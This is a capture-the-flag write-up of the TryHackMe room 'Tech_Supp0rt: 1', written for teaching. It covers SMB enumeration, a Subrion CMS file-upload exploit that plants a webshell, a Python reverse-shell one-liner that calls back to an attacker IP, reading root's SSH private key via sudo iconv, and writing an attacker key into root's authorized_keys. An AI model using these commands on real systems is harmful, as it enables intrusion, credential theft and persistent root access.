---
title: "TryHackMe - Tech_Supp0rt: 1"
author: Nasrallah
description: ""
date: 2022-10-21 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, rce, cve, sudo]
img_path: /assets/img/tryhackme/techsupport
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Tech_Supp0rt: 1](https://tryhackme.com/room/techsupp0rt1) from [TryHackMe](https://tryhackme.com). After scanning the machine, we find an smb share accessible without a password, and there we find a file that has credentials for a CMS. We find out that the CMS is vulnerable to Arbitrary file upload wich we use to get foothold. Checking some config files we find a password for a user that we use to ssh to the machine. Then we exploit a sudo entry to get root.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.232.5
Host is up (0.083s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2022-10-05T07:22:18
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2022-10-05T12:52:20+05:30
|_clock-skew: mean: -2h22m27s, deviation: 3h10m30s, median: -32m29s

```

The target is an Ubuntu linux machine running OpenSSH on port 22, Apache web server on port 80, and SMB on port 139 and 445.

### SMB

Let's list the available share on smb with `sudo smbclient -L 10.10.10.10 -N`.

```terminal
$ sudo smbclient -L 10.10.232.5 -N                                      
lpcfg_do_global_parameter: WARNING: The "client use spnego" option is deprecated
lpcfg_do_global_parameter: WARNING: The "client ntlmv2 auth" option is deprecated
                                                                              
        Sharename       Type      Comment
        ---------       ----      -------                                                                                                                    
        print$          Disk      Printer Drivers
        websvr          Disk      
        IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
                                       
        Server               Comment
        ---------            -------                                          
        TECHSUPPORT          TechSupport server (Samba, Ubuntu)
                                       
        Workgroup            Master
        ---------            -------
        WORKGROUP            

```

We found a 3 shares, but the one that looks interesting is `websvr`, let's connect to it with `sudo sudo smbclient //10.10.10.10/websvr -N`.

```terminal
$ sudo smbclient //10.10.232.5/websvr -N                                                                                                               1 ⨯
lpcfg_do_global_parameter: WARNING: The "client use spnego" option is deprecated
lpcfg_do_global_parameter: WARNING: The "client ntlmv2 auth" option is deprecated
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 29 03:17:38 2021
  ..                                  D        0  Sat May 29 03:03:47 2021
  enter.txt                           N      273  Sat May 29 03:17:38 2021

                8460484 blocks of size 1024. 5698820 blocks available
smb: \> get enter.txt
getting file \enter.txt of size 273 as enter.txt (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
smb: \> quit
```

We found a file called enter.txt, and downloaded with `get enter.txt`. Let's check the file.

```terminal
$ cat enter.txt                         
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazREDACTEDzaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->

```

We found Wordpress credentials, a page called `/subrion` that doesn't work and can be edited from panel.

### Web

Let's navigate to the web page.

![](1.png)

It's Apache default page.

let's try going to `/subrion/panel`

![](2.png)

We found a login page, before we try to login, first we need to decode the password string we got.

![](3.png)

Let's login

![](4.png)

We found the version of subrion. Let's check for available exploits in this version.

```terminal
$ searchsploit subrion 4.2.1
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Subrion 4.2.1 - 'Email' Persistant Cross-Site Scripting                                                                    | php/webapps/47469.txt
Subrion CMS 4.2.1 - 'avatar[path]' XSS                                                                                     | php/webapps/49346.txt
Subrion CMS 4.2.1 - Arbitrary File Upload                                                                                  | php/webapps/49876.py
Subrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin)                                                           | php/webapps/50737.txt
Subrion CMS 4.2.1 - Cross-Site Scripting                                                                                   | php/webapps/45150.txt
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

There is an arbitrary file upload exploit, let's copy it to the current directory with `searchsploit -m php/webapps/49876.py`

## **Foothold**

Let's see what options the exploits takes.

```terminal
$ python3 49876.py -h                                  
Usage: 49876.py [options]                                                                                                                                    
                                                                              
Options:    
                                                                                                                                                 
  -h, --help            show this help message and exit           
  -u URL, --url=URL     Base target uri http://target/panel                   
  -l USER, --user=USER  User credential to login                                                                                                             
  -p PASSW, --passw=PASSW   Password credential to login 
```

Let's run the exploit with `sudo python3 49876.py -u http://10.10.232.5/subrion/panel/ -l admin -p {password}`


```terminal
$ sudo python3 49876.py -u http://10.10.232.5/subrion/panel/ -l admin -p {password}                                                                      1 ⨯
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://10.10.232.5/subrion/panel/
[+] Success!
[+] Got CSRF token: OCNeAYMsDRNV04RLDnqjVdvzqRT94kShyUpwRyoT
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: xcntsbdyrzpwdec

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://10.10.232.5/subrion/panel/uploads/xcntsbdyrzpwdec.phar 

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Let's now get a reverse shell by setting up a listener with `nc -lvnp 9001` and executing the following command:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

>Change the ip address to your tun0 ip.

![](5.png)


## **Privilege Escalation**

After some basic enumeration on the machine, we come across wordpress config file where we find a password.

![](6.png)

Let's ssh into the machine as user `scamsite`(the one we found on the home directory) and the password we just got.

![](7.png)

Let's check our current privileges with teh current user.

```terminal
scamsite@TechSupport:~$ sudo -l
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv

```

We can run `iconv` as root. Let's chelk [GTFOBins](https://gtfobins.github.io/gtfobins/iconv/#sudo).

![](8.png)

We can use this to read any file we want, let's get root's private ssh key.

```bash
sudo iconv -f 8859_1 -t 8859_1 /root/.ssh/id_rsa
```

![](9.png)

Couldn't connect with the key, but we can upload our public to the target, and use `iconv` to copy the key to `authorized_keys` file.

```terminal
scamsite@TechSupport:~$ wget http://10.11.31.131/sirius.pub

scamsite@TechSupport:~$ sudo iconv -f 8859_1 -t 8859_1 sirius.pub -o /root/.ssh/authorized_keys
```

Now we can connect as root without a password.

![](10.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
